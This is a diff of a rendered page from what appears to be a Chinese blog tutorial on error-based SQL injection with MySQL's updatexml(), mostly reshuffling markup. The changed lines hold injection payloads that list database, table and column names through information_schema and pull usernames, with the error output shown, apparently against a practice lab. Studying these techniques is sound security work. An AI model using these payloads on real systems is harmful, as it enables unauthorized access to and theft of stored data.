@@ -508,7 +508,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    15 分
                 </div>
                 
 
@@ -834,31 +834,34 @@ ERROR <span class="token number">1105</span> <span class="token punctuation">(</
   ┝▬table_schema(存放数据库名)
   ┝▬table_name(存放表名)
   ┝▬column_name(存放列名)</code></pre>
-<ul>
-<li><p>首先，取一个名为<strong>information_schema</strong>的数据库里的<strong>schemata</strong>数据表查询<strong>全部数据库名</strong>，SQL语句执行结果如下图所示。(若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名)。</p>
-<pre class=" language-mysql"><code class="language-mysql">select id,username,password from users where id = 1 or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1);
-
--- 输出
-ERROR 1105 (HY000): XPATH syntax error: '~information_schema~'
--- 通过修改limit参数可遍历出所有数据库名称</code></pre>
-</li>
-<li><p>接着，在<strong>information_schema</strong>的一个名为<strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p>
-<pre class=" language-mysql"><code class="language-mysql">-- 当前数据库所有表名
-select id,username,password from users where id = -1 or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);
--- 输出 
-ERROR 1105 (HY000): XPATH syntax error: '~emails~'
-
--- 指定数据库所有表名
-select id,username,password from users where id = -1 or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1);
--- 输出
-ERROR 1105 (HY000): XPATH syntax error: '~emails~'</code></pre>
-</li>
-</ul>
 </li>
 </ul>
 </li>
 </ol>
-<pre><code> - 其次，通过其表名，查询该表的所有字段名（列名）。通过**information_schema**库下的**columns**表可查询对应的数据库/数据库表含有的字段名。
+<pre><code> - 首先，取一个名为**information_schema**的数据库里的**schemata**数据表查询**全部数据库名**，SQL语句执行结果如下图所示。(若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名)。
+
+   ```mysql
+   select id,username,password from users where id = 1 or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1);
+
+   -- 输出
+   ERROR 1105 (HY000): XPATH syntax error: &#39;~information_schema~&#39;</code></pre><p>  – 通过修改limit参数可遍历出所有数据库名称<br>       ```</p>
+<pre><code> - 接着，在**information_schema**的一个名为**tables**的数据表中存着全部的**数据表信息**。其中，**table_name 字段保存其名称**，**table_schema保存其对应的数据库名**。
+
+   ```mysql
+   -- 当前数据库所有表名
+   select id,username,password from users where id = -1 or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);
+   -- 输出 
+   ERROR 1105 (HY000): XPATH syntax error: &#39;~emails~&#39;
+
+   -- 指定数据库所有表名
+   select id,username,password from users where id = -1 or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e),1);
+   -- 输出
+   ERROR 1105 (HY000): XPATH syntax error: &#39;~emails~&#39;
+   ```
+
+
+
+ - 其次，通过其表名，查询该表的所有字段名（列名）。通过**information_schema**库下的**columns**表可查询对应的数据库/数据库表含有的字段名。
 
    ```mysql
    -- 当前数据库中的users表
@@ -871,8 +874,9 @@ ERROR 1105 (HY000): XPATH syntax error: '~emails~'</code></pre>
    select id,username,password from users where id = -1 or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),0x7e),1);
    -- 输出
    ERROR 1105 (HY000): XPATH syntax error: &#39;~id~&#39;
-   ```</code></pre><p>​       </p>
-<pre><code> - 知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。
+   ```
+
+ - 知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。
 
    ```mysql
    -- 查询security数据库的users表中指定字段值
@@ -881,7 +885,7 @@ ERROR 1105 (HY000): XPATH syntax error: '~emails~'</code></pre>
    ERROR 1105 (HY000): XPATH syntax error: &#39;~Dumb~&#39;
    ```
 
- 简单的说，**查库名→查表名→查字段名→查数据**</code></pre><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><h2 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h2><ul>
+  简单的说，**查库名→查表名→查字段名→查数据**</code></pre><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h1><h2 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h2><ul>
 <li>服务器系统：<code>Windows Server 2008 R2</code></li>
 <li>脚本：<code>php-5.2.17nts</code></li>
 <li>中间件：<code>Apache-2.4.29</code></li>
@@ -1588,7 +1592,7 @@ select username,id,email from member where username like '%x' and updatexml(0x7e
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">289.7k</span>&nbsp;字
+                class="white-color">291.8k</span>&nbsp;字
             
             
             
